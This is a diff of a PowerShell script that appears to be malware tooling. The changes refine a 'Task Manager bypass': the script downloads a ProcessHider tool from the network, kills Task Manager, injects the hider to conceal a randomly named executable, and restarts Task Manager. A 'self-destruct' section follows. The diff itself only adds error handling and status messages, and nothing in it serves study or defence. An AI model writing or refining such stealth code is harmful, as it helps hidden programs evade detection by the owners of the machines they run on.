@@ -141,8 +141,6 @@ try {
 }
 
 # ========== ADDED: PROCESS HIDER (TASK MANAGER BYPASS) ==========
-# Ye code original script ke baad chalta hai, kuch change nahi karta
-
 Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan
 
 # Download ProcessHider if not exists
@@ -155,7 +153,6 @@ if (-not (Test-Path $hiderPath)) {
     try {
         Invoke-WebRequest -Uri $hiderUrl -OutFile $zipPath -UseBasicParsing
         Expand-Archive -Path $zipPath -DestinationPath "$env:TEMP\ProcessHiderExtract" -Force
-        # Copy the EXE from MainFile folder
         $hiderExe = Get-ChildItem -Path "$env:TEMP\ProcessHiderExtract" -Recurse -Filter "ProcessHider.exe" | Select-Object -First 1
         if ($hiderExe) {
             Copy-Item $hiderExe.FullName -Destination $hiderPath -Force
@@ -173,21 +170,34 @@ if (Test-Path $hiderPath) {
     # Kill old Task Manager
     try {
         Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Write-Host "[+] Old Task Manager Killed" -ForegroundColor Gray
     } catch {}
     
-    # Hide the EXE (using name from above - $rnd.exe)
-    Start-Process -FilePath $hiderPath -ArgumentList "-n `"$rnd.exe`" -x `"taskmgr.exe`"" -WindowStyle Hidden -Wait -NoNewWindow
-    Write-Host "[+] Process Hidden from Task Manager!" -ForegroundColor Green
+    # Hide the EXE using ProcessHider (FIXED - No conflicting parameters)
+    try {
+        $hideArg = "-n `"$rnd.exe`" -x `"taskmgr.exe`""
+        Start-Process -FilePath $hiderPath -ArgumentList $hideArg -WindowStyle Hidden
+        Write-Host "[+] Process Hide Command Sent" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Could not hide process: $_" -ForegroundColor Yellow
+    }
+    
+    # Wait a moment for injection
+    Start-Sleep -Seconds 3
     
     # Restart Task Manager
-    Start-Sleep -Seconds 2
-    Start-Process "taskmgr.exe" -WindowStyle Normal
-    Write-Host "[+] Task Manager Restarted" -ForegroundColor Green
+    try {
+        Start-Process "taskmgr.exe" -WindowStyle Normal
+        Write-Host "[+] Task Manager Restarted" -ForegroundColor Green
+        Write-Host "[*] Your EXE should now be HIDDEN from Task Manager" -ForegroundColor White
+    } catch {
+        Write-Host "[!] Could not restart Task Manager" -ForegroundColor Yellow
+    }
 } else {
     Write-Host "[!] ProcessHider not available. Task Manager bypass skipped." -ForegroundColor Yellow
 }
 
-# ========== END OF ADDED CODE ==========
+Write-Host "`n[+] ALL OPERATIONS COMPLETE" -ForegroundColor Green
 
 # 6. SELF-DESTRUCT
 Remove-Variable * -ErrorAction SilentlyContinue 2>$null
